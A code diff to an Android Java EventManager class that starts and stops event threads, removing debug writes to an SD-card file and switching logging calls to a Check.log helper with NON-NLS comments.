@@ -11,11 +11,8 @@ import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
 
-import android.util.Log;
-
 import com.android.service.Manager;
 import com.android.service.auto.Cfg;
-import com.android.service.file.AutoFile;
 import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
@@ -24,7 +21,7 @@ import com.android.service.util.Check;
  */
 public class EventManager extends Manager<EventBase, Integer, Integer> {
 	/** The Constant TAG. */
-	private static final String TAG = "EventManager";
+	private static final String TAG = "EventManager"; //$NON-NLS-1$
 
 	/** The singleton. */
 	private volatile static EventManager singleton;
@@ -83,14 +80,14 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 
 		if (events == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Events map null");
+				Check.log(TAG + " Events map null") ;//$NON-NLS-1$
 			}
 			return false;
 		}
 
 		if (running == null) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Running Events map null");
+				Check.log(TAG + " Running Events map null") ;//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -103,7 +100,7 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 			final EventConf conf = pairs.getValue();
 			final Integer type = conf.getType();
 			if (Cfg.DEBUG) {
-				Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping");
+				Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping"); //$NON-NLS-1$
 			}
 
 			final EventBase e = createEvent(type, conf);
@@ -118,12 +115,12 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 					}
 					t.start();
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (startAll): " + e);
+						Check.log(TAG + " (startAll): " + e) ;//$NON-NLS-1$
 					}
 					threads.put(e, t);
 				} else {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " Warn: event already running");
+						Check.log(TAG + " Warn: event already running") ;//$NON-NLS-1$
 					}
 				}
 			}
@@ -140,64 +137,59 @@ public class EventManager extends Manager<EventBase, Integer, Integer> {
 		final Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet().iterator();
 
 		if (Cfg.DEBUG) {
-			Log.d("QZ", TAG + " (stopAll)");
+			Check.log( TAG + " (stopAll)") ;//$NON-NLS-1$
 		}
-
-		AutoFile debug = new AutoFile("/mnt/sdcard", "debug.txt");
 
 		while (it.hasNext()) {
 			final Map.Entry<Integer, EventBase> pairs = it.next();
 			final EventBase event = pairs.getValue();
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Stopping: " + event);
+				Check.log(TAG + " Stopping: " + event) ;//$NON-NLS-1$
 			}
 
 			try {
-				debug.append("    stop event: " + event + "\n");
 
 				if (event.isRunning()) {
-					debug.append("    running event: " + event + "\n");
 					event.stopThread();
 
 					try {
 						final Thread t = threads.get(event);
 						if (Cfg.DEBUG) {
-							Check.asserts(t != null, "Null thread");
+							Check.asserts(t != null, "Null thread"); //$NON-NLS-1$
 						}
 
 						if (t != null) {
-							debug.append("    join event: " + event + "\n");
 							t.join();
-							debug.append("    delete event: " + event+ "\n");
 							threads.remove(event);
+						} else {
+
 						}
 
 					} catch (final InterruptedException e) {
 						if (Cfg.DEBUG) {
-							Check.log(e);
-							Check.log(TAG + " Error: " + e.toString());
+							Check.log(e) ;//$NON-NLS-1$
+							Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
 						}
 					}
 				} else {
 					if (Cfg.DEBUG) {
-						Check.asserts(threads.get(event) == null, "Shouldn't find a thread");
+						Check.asserts(threads.get(event) == null, "Shouldn't find a thread"); //$NON-NLS-1$
 					}
 				}
 			} catch (Exception ex) {
-				debug.write(ex.toString() + "\n");
 				if (Cfg.DEBUG) {
-					Log.d("QZ", TAG + " (stopAll): " + ex);
+					Check.log(TAG + " (stopAll): " + ex) ;//$NON-NLS-1$
 				}
 			}
 
 		}
 
 		if (Cfg.DEBUG) {
-			Check.ensures(threads.size() == 0, "Non empty threads");
+			Check.ensures(threads.size() == 0, "Non empty threads"); //$NON-NLS-1$
 		}
 		if (Cfg.DEBUG) {
-			Check.ensures(running.size() == 0, "Non empty running");
+			Check.ensures(running.size() == 0, "Non empty running"); //$NON-NLS-1$
 		}
 
 		running.clear();
